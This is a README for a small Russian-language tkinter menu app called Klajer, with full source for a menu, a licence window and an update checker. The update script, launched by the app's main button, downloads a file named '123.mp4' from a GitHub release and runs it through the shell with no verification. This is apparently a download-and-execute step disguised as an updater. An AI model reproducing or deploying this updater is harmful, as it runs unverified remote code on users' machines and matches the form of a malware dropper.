# <div align="center">  
  <img src="https://img.shields.io/badge/Python-3.7%2B-green" alt="Python Version">  
  <img src="https://img.shields.io/badge/License-MIT-blue" alt="License: MIT">  
</div>

<h1 align="center">Klajer</h1>

<p align="center">  
  <b>Многофункциональное tkinter-приложение с проверкой обновлений, стильным круглым меню и лицензией MIT.</b>  
</p>

<p align="center">  
  <img src="https://user-images.githubusercontent.com/00000/00000000-placeholder-0000-0000-0000-000000000001.png" width="450" alt="Klajer UI Пример" />  
</p>

---

## :sparkles: Оглавление

1. [Особенности](#Особенности)  
2. [Как запустить](#Как-запустить)  
3. [Структура проекта](#Структура-проекта)  
4. [Файлы](#Файлы)  
   - [check-the-update.py](#check-the-updatepy)  
   - [Menu.py](#menupy)  
   - [License-agreement.py](#license-agreementpy)  
5. [Зависимости](#Зависимости)  
6. [Лицензия](#Лицензия)  
7. [Авторы](#Авторы)  

---

## :star: Особенности

- **Красивое анимированное меню** на базе `tkinter` с плавными круглыми углами.  
- **Встроенная проверка обновлений** через Python-скрипт, который скачивает файл с GitHub Releases.  
- **Быстрый доступ** к YouTube прямо из программы.  
- **Просмотр лицензионного соглашения** в отдельном окне.  
- **Автоматическое обновление времени** в реальном времени.  
- **MIT лицензия** — свободное использование и модификация.

---

## :rocket: Как запустить

1. **Клонируйте** данный репозиторий или скачайте ZIP-архив:

   ```bash
   git clone https://github.com/kromskii2/Klajer.git
   ```

2. **Установите зависимости** (убедитесь, что у вас установлен Python 3.7+ и pip):

   ```bash
   pip install requests
   ```

3. **Запустите главное меню**:

   ```bash
   python Menu.py
   ```

4. Для проверки обновлений вручную можно запустить **check-the-update.py**:

   ```bash
   python check-the-update.py
   ```

5. Для просмотра лицензионного соглашения отдельно:

   ```bash
   python License-agreement.py
   ```

---

## :open_file_folder: Структура проекта

```bash
Klajer
├── Menu.py                   # Запускает главное окно с круглым меню
├── check-the-update.py       # Проверяет наличие обновлений и скачивает их
├── License-agreement.py      # Открывает окно с лицензионным соглашением
└── temp/                     # Временная папка для загрузки обновлений (создаётся автоматически)
```

---

## :page_facing_up: Файлы

### **check-the-update.py**

```python
import os
import requests
import subprocess

def download_file(url, save_path):
    try:
        response = requests.get(url)
        with open(save_path, 'wb') as f:
            f.write(response.content)
        print("Файл успешно скачан и сохранён в", save_path)
        return True
    except Exception as e:
        print("Ошибка при скачивании файла:", e)
        return False

def run_update_file(file_path):
    try:
        subprocess.call(file_path, shell=True)
        print("Файл обновления успешно запущен")
    except Exception as e:
        print("Ошибка при запуске файла обновления:", e)

if __name__ == "__main__":
    update_url = "https://github.com/kromskii2/Klajer/releases/download/check-the-update/123.mp4"
    temp_folder = "temp"
    update_file_name = "123.mp4"  # Имя скачиваемого файла обновления

    if not os.path.exists(temp_folder):
        os.makedirs(temp_folder)

    update_file_path = os.path.join(temp_folder, update_file_name)

    if download_file(update_url, update_file_path):
        run_update_file(update_file_path)
    else:
        print("Не удалось скачать файл обновления.")
```

**Назначение**:  
- Проверяет наличие обновления по ссылке (GitHub Releases).  
- Скачивает файл (в данном примере — `123.mp4`) в папку `temp`.  
- Запускает скачанный файл после загрузки.

<br />

### **Menu.py**

```python
import tkinter as tk
import webbrowser
import time
import asyncio
import subprocess

class RoundedMenuApp:
    def __init__(self, width, height, corner_radius):
        self.width = width
        self.height = height
        self.corner_radius = corner_radius

        self.root = tk.Tk()
        self.root.title("Klajer")  # Changed the title of the application

        # Get the screen width and height
        screen_width = self.root.winfo_screenwidth()
        screen_height = self.root.winfo_screenheight()

        # Calculate x and y position for the Tk root window
        x = (screen_width / 2) - (width / 2)
        y = (screen_height / 2) - (height / 2)

        self.root.geometry(f"{width}x{height}+{int(x)}+{int(y)}")  # Set geometry with position

        self.canvas = tk.Canvas(self.root, width=width, height=height, bg="white", highlightthickness=0)
        self.canvas.pack()

        self.draw_rounded_corners()
        self.create_youtube_button()
        self.create_license_button()  # Added the license button
        self.create_update_button()   # Added the update button

        # Create a label to display the time
        self.time_label = tk.Label(self.root, text="", font=("Arial", 12))
        self.time_label.place(relx=0.5, rely=1, anchor="s")

        # Start updating time
        self.update_time()

    def draw_rounded_corners(self):
        x0, y0 = 0, 0
        x1, y1 = self.width, self.height
        radius = self.corner_radius
        self.canvas.create_arc(x0, y0, x0 + radius * 2, y0 + radius * 2, start=90, extent=90, fill="white",
                               outline="white")
        self.canvas.create_arc(x1 - radius * 2, y0, x1, y0 + radius * 2, start=0, extent=90, fill="white",
                               outline="white")
        self.canvas.create_arc(x0, y1 - radius * 2, x0 + radius * 2, y1, start=180, extent=90, fill="white",
                               outline="white")
        self.canvas.create_arc(x1 - radius * 2, y1 - radius * 2, x1, y1, start=270, extent=90, fill="white",
                               outline="white")

    def create_youtube_button(self):
        youtube_button = tk.Button(self.root, text="YouTube", command=self.open_youtube)
        youtube_button.place(relx=1, rely=1, anchor="se")

    def create_license_button(self):
        license_button = tk.Button(self.root, text="License", command=self.open_license)
        license_button.place(relx=0, rely=1, anchor="sw")

    def create_update_button(self):
        update_button = tk.Button(self.root, text="Проверить обновление", command=self.open_update)
        update_button.place(relx=0.5, rely=0.5, anchor="center")

    async def async_open_license(self):
        await asyncio.create_subprocess_exec('python', 'License-agreement.py')

    async def async_open_update(self):
        await asyncio.create_subprocess_exec('python', 'check-the-update.py')

    def open_license(self):
        asyncio.run(self.async_open_license())  # Run the async function in a synchronous context

    def open_update(self):
        asyncio.run(self.async_open_update())  # Run the async function in a synchronous context

    def open_youtube(self):
        webbrowser.open_new_tab("https://www.youtube.com/")

    def update_time(self):
        current_time = time.strftime("%H:%M:%S")
        self.time_label.config(text=current_time)
        self.root.after(1000, self.update_time)  # Update time every second

    def run(self):
        self.root.mainloop()


# Create and run the application
app = RoundedMenuApp(width=646, height=396, corner_radius=30)
app.run()
```

**Назначение**:  
- Создаёт окно с закруглёнными углами с помощью `tkinter.Canvas`.  
- Кнопка **YouTube** открывает браузер с YouTube.  
- Кнопка **License** открывает соглашение.  
- Кнопка **Проверить обновление** запускает скрипт `check-the-update.py`.  
- Отображает текущее время и обновляет его каждую секунду.

<br />

### **License-agreement.py**

```python
import tkinter as tk

# Создаем главное окно
root = tk.Tk()

# Задаем размеры окна
root.geometry("560x660")

# Задаем заголовок окна
root.title("Лицензионное соглашение")

# Текст лицензионного соглашения
license_text = """
Лицензионное соглашение

Разрешение на использование:
Любой может свободно использовать программное обеспечение под MIT лицензией в своих проектах, включая коммерческие приложения.

Разрешение на модификацию:
Пользователи имеют право изменять и модифицировать исходный код программы.

Сохранение авторских прав:
MIT лицензия требует сохранения копии оригинального уведомления об авторских правах и лицензионной информации во всех копиях программного обеспечения.

Отказ от гарантий:
Лицензия предоставляется "как есть", без каких-либо явных или подразумеваемых гарантий, что делает авторов или держателей лицензии невиновными в случае проблем, возникающих в результате использования программного обеспечения.

Отказ от ответственности:
Авторы или держатели лицензии не несут ответственности за любые ущербы, прямые или косвенные, возникающие в результате использования программного обеспечения.
"""

# Создаем текстовое поле для отображения лицензионного соглашения
license_label = tk.Label(root, text=license_text, justify='left', anchor='w', padx=10, pady=10, wraplength=540)
license_label.pack(fill='both', expand=True)

# Запускаем главный цикл обработки событий
root.mainloop()
```

**Назначение**:  
- Показ лицензии в отдельном графическом окне.  
- Полный текст соглашения, основанного на MIT License.

---

## :electric_plug: Зависимости

Для корректной работы проекта необходимы следующие библиотеки и версии Python:

- **Python 3.7+**  
- **requests** (для загрузки обновлений)  
- **tkinter** (обычно входит в стандартную библиотеку Python для Windows/Mac/Linux)  

Вы можете установить все зависимости вручную или использовать `pip`:

```bash
pip install requests
```

---

## :bookmark: Лицензия

Данное приложение распространяется под **MIT License**.  
[Подробнее читайте здесь](License-agreement.py).

```
MIT License

Copyright (c) [2023]

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the “Software”), to deal
in the Software without restriction...
```

---

## :busts_in_silhouette: Авторы

- **[kromskii2](https://github.com/kromskii2)** — Автор исходного проекта.  
- **Все желающие** — могут вносить вклад и улучшения.

---

<p align="center">
  Сделано с любовью и кружкой :coffee:
</p>

<p align="center">
  <img src="https://user-images.githubusercontent.com/00000/00000000-placeholder-0000-0000-0000-000000000002.png" width="400" alt="Python Image" />
</p>

---

<div align="center">
  
  :sparkles:  
  Спасибо за использование Klajer! Если у вас есть вопросы, пишите в  
  <a href="https://github.com/kromskii2/Klajer/issues">Issue Tracker</a>  
  или создавайте Pull Request!  
  
</div>
